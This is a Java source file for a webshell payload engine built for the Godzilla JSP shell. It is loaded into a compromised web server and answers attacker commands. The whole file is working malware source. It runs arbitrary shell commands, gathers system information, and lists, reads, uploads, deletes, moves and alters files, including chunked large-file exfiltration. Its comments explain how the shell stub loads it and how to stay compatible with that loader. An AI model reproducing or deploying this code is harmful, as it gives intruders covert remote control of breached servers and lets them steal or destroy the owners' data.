import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * Matrix-owned Godzilla JSP payload engine.
 *
 * This is the engine, not the shell stub. It is seeded into a standard
 * Godzilla JSP shell, which does:
 *
 *   Object f = ((Class) session.getAttribute("payload")).newInstance();
 *   f.equals(arrOut);          // ByteArrayOutputStream
 *   f.equals(pageContext);     // PageContext
 *   f.toString();
 *   response.write(base64(AES(arrOut.toByteArray())));
 *
 * Contract: the same methodName API as Godzilla's own engine, so the Matrix
 * connector works with either engine.
 *
 * Build:
 *   javac --release 8 -d out MatrixGodzillaEngine.java
 *
 * The standard shell only needs a public no-arg constructor and the
 * equals/toString entry points; the class name is irrelevant.
 */
public class MatrixGodzillaEngine {

    private ByteArrayOutputStream out;
    private Object pageContext;

    public MatrixGodzillaEngine() {
    }

    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (obj instanceof ByteArrayOutputStream) {
            this.out = (ByteArrayOutputStream) obj;
            return true;
        }
        if (obj instanceof byte[]) {
            // Some shells pass the decrypted data directly.
            this.out = null;
            writeGzip(dispatchBytes((byte[]) obj));
            return true;
        }
        // PageContext / HttpServletRequest / ServletRequest.
        this.pageContext = obj;
        run();
        return true;
    }

    public String toString() {
        return "";
    }

    // ------------------------------------------------------------------
    // Entry
    // ------------------------------------------------------------------

    private void run() {
        try {
            byte[] data = null;
            Object ctx = this.pageContext;
            if (ctx != null) {
                try {
                    Object request = invokeNoArg(ctx, "getRequest");
                    if (request != null) {
                        Object value = invokeOneArg(request, "getAttribute", String.class, "parameters");
                        if (value instanceof byte[]) {
                            data = (byte[]) value;
                        }
                    }
                } catch (Throwable ignored) {
                }
                if (data == null) {
                    try {
                        Object value = invokeOneArg(ctx, "getAttribute", String.class, "parameters");
                        if (value instanceof byte[]) {
                            data = (byte[]) value;
                        }
                    } catch (Throwable ignored) {
                    }
                }
            }
            if (data == null) {
                return;
            }
            writeGzip(dispatchBytes(data));
        } catch (Throwable t) {
            writeGzip(bytes("Exception: " + t));
        }
    }

    private byte[] dispatchBytes(byte[] data) {
        Map<String, byte[]> params = parse(maybeGunzip(data));
        String method = str(params, "methodName");
        return dispatch(method, params);
    }

    private byte[] dispatch(String method, Map<String, byte[]> params) {
        try {
            if (method == null) {
                return bytes("methodName is null");
            }
            switch (method) {
                case "getBasicsInfo":
                    return bytes(basicsInfo());
                case "execCommand":
                    return execCommand(params);
                case "getFile":
                    return bytes(getFile(str(params, "dirName")));
                case "readFile":
                    return readFile(str(params, "fileName"));
                case "uploadFile":
                    return bytes(uploadFile(str(params, "fileName"), params.get("fileValue")));
                case "newFile":
                    return bytes(newFile(str(params, "fileName")));
                case "newDir":
                    return bytes(newDir(str(params, "dirName")));
                case "deleteFile":
                    return bytes(deleteFile(str(params, "fileName")));
                case "copyFile":
                    return bytes(copyFile(str(params, "srcFileName"), str(params, "destFileName")));
                case "moveFile":
                    return bytes(moveFile(str(params, "srcFileName"), str(params, "destFileName")));
                case "setFileAttr":
                    return bytes(setFileAttr(str(params, "type"), str(params, "fileName"), str(params, "attr")));
                case "bigFileDownload":
                    return bigFileDownload(params);
                case "bigFileUpload":
                    return bytes(bigFileUpload(params));
                case "test":
                    return bytes("ok");
                default:
                    return bytes("unknown method: " + method);
            }
        } catch (Throwable t) {
            return bytes("Exception: " + t);
        }
    }

    // ------------------------------------------------------------------
    // Parameter codec
    // ------------------------------------------------------------------


    private static byte[] maybeGunzip(byte[] data) {
        if (data == null || data.length < 2) {
            return data == null ? new byte[0] : data;
        }
        if ((data[0] & 0xff) != 0x1f || (data[1] & 0xff) != 0x8b) {
            return data;
        }
        try {
            GZIPInputStream gz = new GZIPInputStream(new java.io.ByteArrayInputStream(data));
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int n;
            while ((n = gz.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            gz.close();
            return out.toByteArray();
        } catch (Throwable t) {
            return data;
        }
    }

    private static Map<String, byte[]> parse(byte[] data) {
        Map<String, byte[]> map = new LinkedHashMap<String, byte[]>();
        int i = 0;
        StringBuilder key = new StringBuilder();
        while (i < data.length) {
            int b = data[i] & 0xff;
            if (b == 0x02) {
                if (i + 5 > data.length) {
                    break;
                }
                int len = (data[i + 1] & 0xff)
                        | ((data[i + 2] & 0xff) << 8)
                        | ((data[i + 3] & 0xff) << 16)
                        | ((data[i + 4] & 0xff) << 24);
                i += 5;
                if (len < 0 || i + len > data.length) {
                    break;
                }
                map.put(key.toString(), Arrays.copyOfRange(data, i, i + len));
                key.setLength(0);
                i += len;
            } else {
                key.append((char) b);
                i++;
            }
        }
        return map;
    }

    private static String str(Map<String, byte[]> params, String key) {
        byte[] value = params.get(key);
        return value == null ? null : new String(value, StandardCharsets.UTF_8);
    }

    private static byte[] bytes(String value) {
        return value.getBytes(StandardCharsets.UTF_8);
    }

    // ------------------------------------------------------------------
    // Output
    // ------------------------------------------------------------------

    private void writeGzip(byte[] data) {
        if (out == null) {
            return;
        }
        try {
            GZIPOutputStream gz = new GZIPOutputStream(out);
            gz.write(data);
            gz.finish();
            gz.flush();
        } catch (Throwable t) {
            try {
                out.write(data);
            } catch (Throwable ignored) {
            }
        }
    }

    // ------------------------------------------------------------------
    // Operations
    // ------------------------------------------------------------------

    private String basicsInfo() {
        StringBuilder sb = new StringBuilder();
        // Web 应用根目录：PageContext.getServletContext().getRealPath("/")
        String docBase = docBasePath();
        if (docBase != null && docBase.length() > 1) {
            while (docBase.endsWith("/")) {
                docBase = docBase.substring(0, docBase.length() - 1);
            }
        }
        sb.append("OsInfo : ").append(System.getProperty("os.name", ""))
                .append(" ").append(System.getProperty("os.version", ""))
                .append(" ").append(System.getProperty("os.arch", "")).append("\n");
        sb.append("CurrentUser : ").append(System.getProperty("user.name", "")).append("\n");
        sb.append("CurrentDir : ").append(new File(".").getAbsolutePath()).append("\n");
        if (docBase != null && docBase.length() > 0) {
            sb.append("DocBase : ").append(docBase).append("\n");
            sb.append("RealFile : ").append(docBase).append("\n");
        }
        sb.append("FileRoot : ").append(fileRoots()).append("\n");
        sb.append("ProcessArch : ").append(is64() ? "64" : "32").append("\n");
        sb.append("TempDirectory : ").append(System.getProperty("java.io.tmpdir", "")).append("\n");
        sb.append("java.version : ").append(System.getProperty("java.version", "")).append("\n");
        sb.append("os.name : ").append(System.getProperty("os.name", "")).append("\n");
        sb.append("os.version : ").append(System.getProperty("os.version", "")).append("\n");
        sb.append("os.arch : ").append(System.getProperty("os.arch", "")).append("\n");
        sb.append("java.class.version : ").append(System.getProperty("java.class.version", "")).append("\n");
        sb.append("user.dir : ").append(System.getProperty("user.dir", "")).append("\n");
        sb.append("line.separator : ").append(System.getProperty("line.separator", "")).append("\n");
        return sb.toString();
    }

    /** 通过反射取 webapp 物理根目录；拿不到时返回 null。 */
    private String docBasePath() {
        Object ctx = this.pageContext;
        if (ctx == null) {
            return null;
        }
        try {
            Object servletContext = invokeNoArg(ctx, "getServletContext");
            if (servletContext == null) {
                return null;
            }
            Object real = invokeOneArg(servletContext, "getRealPath", String.class, "/");
            if (real instanceof String && ((String) real).length() > 0) {
                return (String) real;
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private static String fileRoots() {
        StringBuilder sb = new StringBuilder();
        File[] roots = File.listRoots();
        if (roots != null) {
            for (File root : roots) {
                sb.append(root.getAbsolutePath()).append(";");
            }
        }
        return sb.toString();
    }

    private static boolean is64() {
        String arch = System.getProperty("os.arch", "");
        return arch.contains("64") || "64".equals(System.getProperty("sun.arch.data.model"));
    }

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    private byte[] execCommand(Map<String, byte[]> params) throws Exception {
        List<String> args = new ArrayList<String>();
        String count = str(params, "argsCount");
        if (count != null && count.length() > 0) {
            int n = Integer.parseInt(count.trim());
            for (int i = 0; i < n; i++) {
                String arg = str(params, "arg-" + i);
                if (arg != null) {
                    args.add(arg);
                }
            }
        } else {
            String cmdLine = str(params, "cmdLine");
            if (cmdLine != null && cmdLine.length() > 0) {
                if (isWindows()) {
                    args.add("cmd.exe");
                    args.add("/c");
                } else {
                    args.add("/bin/sh");
                    args.add("-c");
                }
                args.add(cmdLine);
            }
        }
        if (args.isEmpty()) {
            return bytes("no args");
        }
        ProcessBuilder pb = new ProcessBuilder(args);
        pb.redirectErrorStream(true);
        Process process = pb.start();
        byte[] output = readAll(process.getInputStream());
        process.waitFor();
        return output;
    }


    private static int compareFiles(File a, File b) {
        if (a.isDirectory() != b.isDirectory()) {
            return a.isDirectory() ? -1 : 1;
        }
        return a.getName().compareToIgnoreCase(b.getName());
    }

    private String getFile(String dir) {
        if (dir == null || dir.trim().isEmpty()) {
            dir = System.getProperty("user.dir", ".");
        }
        File d = new File(dir);
        if (!d.isDirectory()) {
            return "Path Not Found Or No Permission!";
        }
        String path = d.getAbsolutePath().replace('\\', '/');
        if (!path.endsWith("/")) {
            path += "/";
        }
        StringBuilder sb = new StringBuilder("ok\n");
        sb.append(path).append("\n");
        File[] files = d.listFiles();
        if (files != null) {
            // 手写排序，避免匿名 Comparator 生成额外的 $1.class
            // （标准 JSP shell 只会 defineClass 我们发送的这一个类）。
            for (int i = 0; i < files.length; i++) {
                for (int j = i + 1; j < files.length; j++) {
                    if (compareFiles(files[i], files[j]) > 0) {
                        File tmp = files[i];
                        files[i] = files[j];
                        files[j] = tmp;
                    }
                }
            }
            SimpleDateFormat fmt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            for (File f : files) {
                String perms = (f.canRead() ? "R" : "")
                        + (f.canWrite() ? "W" : "")
                        + (f.canExecute() ? "X" : "");
                if (perms.isEmpty()) {
                    perms = "F";
                }
                sb.append(f.getName()).append("\t")
                        .append(f.isFile() ? "1" : "0").append("\t")
                        .append(fmt.format(new Date(f.lastModified()))).append("\t")
                        .append(f.length()).append("\t")
                        .append(perms).append("\n");
            }
        }
        return sb.toString();
    }

    private byte[] readFile(String path) throws Exception {
        if (path == null || !new File(path).isFile()) {
            return bytes("File Not Found");
        }
        return Files.readAllBytes(Paths.get(path));
    }

    private String uploadFile(String path, byte[] value) throws Exception {
        if (path == null) {
            return "fail";
        }
        Files.write(Paths.get(path), value == null ? new byte[0] : value);
        return "ok";
    }

    private String newFile(String path) throws Exception {
        if (path == null) {
            return "fail";
        }
        File f = new File(path);
        if (f.exists()) {
            return "ok";
        }
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) {
            parent.mkdirs();
        }
        return f.createNewFile() ? "ok" : "fail";
    }

    private String newDir(String path) {
        if (path == null) {
            return "fail";
        }
        File d = new File(path);
        return d.exists() || d.mkdirs() ? "ok" : "fail";
    }

    private String deleteFile(String path) {
        if (path == null) {
            return "fail";
        }
        File f = new File(path);
        if (!f.exists()) {
            return "fail";
        }
        return deleteRecursive(f) ? "ok" : "fail";
    }

    private static boolean deleteRecursive(File f) {
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    if (!deleteRecursive(child)) {
                        return false;
                    }
                }
            }
        }
        return f.delete();
    }

    private String copyFile(String src, String dst) throws Exception {
        if (src == null || dst == null) {
            return "fail";
        }
        Files.copy(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);
        return "ok";
    }

    private String moveFile(String src, String dst) throws Exception {
        if (src == null || dst == null) {
            return "fail";
        }
        try {
            Files.move(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);
            return "ok";
        } catch (Exception e) {
            // Fall back to copy + delete for cross-device moves.
            Files.copy(Paths.get(src), Paths.get(dst), StandardCopyOption.REPLACE_EXISTING);
            deleteRecursive(new File(src));
            return "ok";
        }
    }

    private String setFileAttr(String type, String path, String attr) throws Exception {
        if (type == null || path == null || attr == null) {
            return "type or attr or fileName is null";
        }
        File f = new File(path);
        if (!f.exists()) {
            return "file not found";
        }
        if ("fileBasicAttr".equals(type)) {
            if (attr.contains("R")) {
                f.setReadable(true);
            }
            if (attr.contains("W")) {
                f.setWritable(true);
            }
            if (attr.contains("X")) {
                f.setExecutable(true);
            }
            return "ok";
        }
        if ("fileTimeAttr".equals(type)) {
            return f.setLastModified(Long.parseLong(attr.trim())) ? "ok" : "fail";
        }
        return "no ExcuteType";
    }

    private byte[] bigFileDownload(Map<String, byte[]> params) throws Exception {
        String path = str(params, "fileName");
        String mode = str(params, "mode");
        if (path == null || !new File(path).isFile()) {
            return bytes("File Not Found");
        }
        if ("fileSize".equals(mode)) {
            return bytes(String.valueOf(new File(path).length()));
        }
        if (!"read".equals(mode)) {
            return bytes("no mode");
        }
        long position = parseLong(str(params, "position"), 0);
        int num = (int) parseLong(str(params, "readByteNum"), 1048576);
        FileInputStream in = new FileInputStream(path);
        try {
            long skipped = 0;
            while (skipped < position) {
                long n = in.skip(position - skipped);
                if (n <= 0) {
                    break;
                }
                skipped += n;
            }
            byte[] buffer = new byte[Math.max(1, num)];
            int read = in.read(buffer);
            if (read <= 0) {
                return new byte[0];
            }
            return Arrays.copyOf(buffer, read);
        } finally {
            in.close();
        }
    }

    private String bigFileUpload(Map<String, byte[]> params) throws Exception {
        String path = str(params, "fileName");
        byte[] contents = params.get("fileContents");
        if (path == null) {
            return "fail";
        }
        byte[] data = contents == null ? new byte[0] : contents;
        String position = str(params, "position");
        if (position == null || position.trim().isEmpty()) {
            FileOutputStream out = new FileOutputStream(path);
            try {
                out.write(data);
                out.flush();
            } finally {
                out.close();
            }
            return "ok";
        }
        RandomAccessFile raf = new RandomAccessFile(path, "rw");
        try {
            raf.seek(Long.parseLong(position.trim()));
            raf.write(data);
        } finally {
            raf.close();
        }
        return "ok";
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    private static long parseLong(String value, long fallback) {
        if (value == null || value.trim().isEmpty()) {
            return fallback;
        }
        try {
            return Long.parseLong(value.trim());
        } catch (NumberFormatException e) {
            return fallback;
        }
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int n;
        while ((n = in.read(buffer)) > 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    private static Object invokeNoArg(Object target, String name) throws Exception {
        Method method = target.getClass().getMethod(name);
        method.setAccessible(true);
        return method.invoke(target);
    }

    private static Object invokeOneArg(Object target, String name, Class<?> type, Object arg)
            throws Exception {
        Method method = target.getClass().getMethod(name, type);
        method.setAccessible(true);
        return method.invoke(target, arg);
    }
}
